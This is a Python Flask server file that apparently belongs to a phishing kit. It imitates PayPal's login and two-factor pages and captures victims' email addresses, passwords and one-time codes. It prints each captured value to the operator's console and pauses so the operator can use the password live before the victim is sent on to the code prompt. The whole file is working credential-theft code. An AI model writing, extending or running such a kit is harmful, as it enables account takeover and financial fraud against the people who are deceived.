from flask import Flask, request, redirect
import logging
import json
from colorama import Fore


from assets.printLogo.printLogo import printLogo
from assets.logs.logs import logs


def server():
    printLogo()

    app = Flask(
        __name__,
        template_folder=None
        )
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

    @app.route("/post", methods=["POST", "GET"])
    def postt():
        selectedChallengeType = request.args.get('selectedChallengeType')
        print(Fore.RED + "[!] " + Fore.GREEN + " OTP Method: " + str(selectedChallengeType))

        if request.method == "POST":
            print(Fore.RED + "[!] " + Fore.GREEN + " Code otp: " + request.form["otpCode-0"] + "-" + request.form["otpCode-1"] + "-" + request.form["otpCode-2"] + "-" + request.form["otpCode-3"] + "-" + request.form["otpCode-4"] + "-" + request.form["otpCode-5"])

            return open("menu/site/siteTemplate/paypal/templates/load.html", "r")
        return open("menu/site/siteTemplate/paypal/templates/getCode.html", "r")

    @app.route("/authflow", methods=["GET", "POST"])
    def authflow():
        return open("menu/site/siteTemplate/paypal/templates/authflow.html", "r")

    @app.route("/", methods=["GET", "POST"])
    def index():
        with open("./settings/settings.json", "r") as f:
            ff = json.load(f)
            if ff["logs"] is True:
                logs(request=request)

        if request.method == "POST":
            user = request.form["login_email"]
            password = request.form["login_password"]

            print(Fore.RED + "[!] " + Fore.GREEN + "User: " + str(user) + Fore.RED + "\n[!] " + Fore.GREEN +  "Password: " + str(password))

            if ff["otp"] is True:
                input(Fore.RED + "Press ENTER to send the password form...")
                print(Fore.GREEN + "[*] " + Fore.RESET + " Redirect...")
                return redirect("/authflow")
            else:
                return open("menu/site/siteTemplate/paypal/templates/load.html", "r")
        return open("menu/site/siteTemplate/paypal/templates/index.html", "r")

    with open("./settings/settings.json", "r") as f:
        ff = json.load(f)
        try:
            print(
                Fore.GREEN + "[*] " + Fore.RESET +
                "Server running on http://" +
                ff["ip"] + ":"
                + str(ff["port"])
                )
            app.run(
                host=ff["ip"],
                port=ff["port"],
                debug=False
            )
        except Exception as e:
            print(e)
            input("Press Enter to continue...")
            return
